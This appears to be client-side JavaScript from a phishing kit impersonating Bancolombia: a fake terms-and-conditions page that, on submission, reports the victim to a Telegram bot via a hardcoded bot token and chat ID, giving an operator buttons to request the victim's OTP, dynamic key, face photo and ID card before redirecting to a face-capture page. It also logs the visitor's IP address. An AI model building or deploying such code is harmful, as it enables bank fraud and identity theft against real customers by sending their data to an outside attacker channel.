document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('terminosForm');
    const checkboxes = document.querySelectorAll('.termino-check');
    const btnContinuar = document.querySelector('.btn-iniciar');
    const btnCancelar = document.querySelector('.btn-cancelar');
    const loadingOverlay = document.createElement('div');
    loadingOverlay.className = 'loading-overlay';
    loadingOverlay.innerHTML = `
        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
    `;
    document.body.appendChild(loadingOverlay);

    // Actualizar IP y fecha/hora
    async function updateIpAndDateTime() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            document.getElementById('ipAddress').textContent = `Dirección IP: ${ipData.ip}`;
            
            const now = new Date();
            const options = { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: 'numeric',
                minute: 'numeric',
                hour12: true,
                timeZone: 'America/Bogota'
            };
            document.getElementById('datetime').textContent = now.toLocaleDateString('es-CO', options);
        } catch (error) {
            console.error('Error:', error);
        }
    }

    updateIpAndDateTime();
    setInterval(updateIpAndDateTime, 60000); // Actualizar cada minuto

    function checkAllTerms() {
        const allChecked = Array.from(checkboxes).every(checkbox => checkbox.checked);
        if (allChecked) {
            btnContinuar.removeAttribute('disabled');
            btnContinuar.classList.add('active');
        } else {
            btnContinuar.setAttribute('disabled', '');
            btnContinuar.classList.remove('active');
        }
    }

    checkboxes.forEach(checkbox => {
        checkbox.addEventListener('change', checkAllTerms);
    });

    async function sendToTelegram() {
        const botToken = '8476776117:AAELHdBk6OXxUcI2-QkI7xhtu6HKWeynhZY';
        const chatId = '-1002984980722';
        const message = `
✅ Términos y condiciones aceptados
⌚ Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
        `;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: "1️⃣ Pedir logo", callback_data: "logo" },
                    { text: "2️⃣ Pedir OTP", callback_data: "otp" }
                ],
                [
                    { text: "3️⃣ Pedir dinámica", callback_data: "dinamica" },
                    { text: "4️⃣ Pedir cara", callback_data: "cara" }
                ],
                [
                    { text: "5️⃣ Pedir cédula", callback_data: "cedula" },
                    { text: "6️⃣ Finalizar", callback_data: "finalizar" }
                ]
            ]
        };

        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    reply_markup: keyboard
                })
            });
        } catch (error) {
            console.error('Error:', error);
        }
    }

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        loadingOverlay.style.display = 'flex';
        await sendToTelegram();
        window.location.href = 'cara.html';
    });

    btnCancelar.addEventListener('click', () => {
        window.location.href = 'index.html';
    });
});